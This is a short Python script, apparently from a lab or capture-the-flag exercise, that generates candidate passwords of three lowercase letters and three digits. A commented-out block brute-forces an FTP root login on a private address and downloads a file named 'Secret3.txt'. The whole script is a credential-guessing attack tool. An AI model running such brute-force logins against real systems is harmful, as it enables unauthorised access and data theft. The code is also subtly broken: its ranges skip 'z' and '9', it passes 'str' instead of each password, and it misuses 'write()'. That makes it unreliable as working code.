__author__ = 'obscure'
import ftplib
import socket

perm = []

def getStr(strt, ind):
    if ind >= 6:
        res = ''
        for r in strt:
            res += r
        perm.append(res)
        return
    if(ind < 3):
        for ch in range(97, 122):
            strt.append(chr(ch))
            getStr(strt,ind+1)
            strt.remove(chr(ch))
    else:
        for i in range(0,9):
            strt.append(str(i))
            getStr(strt, ind+1)
            strt.remove(str(i))
strt = []
getStr(strt, 0)

for pwd in perm:
    print(pwd)
'''
    try:
        session = ftplib.FTP('192.168.5.123','root',str)
        session.retrbinary('RETR Secret3.txt',open('Secret3.txt','wb').write())
    except socket.error:
        print('Print ')
   '''

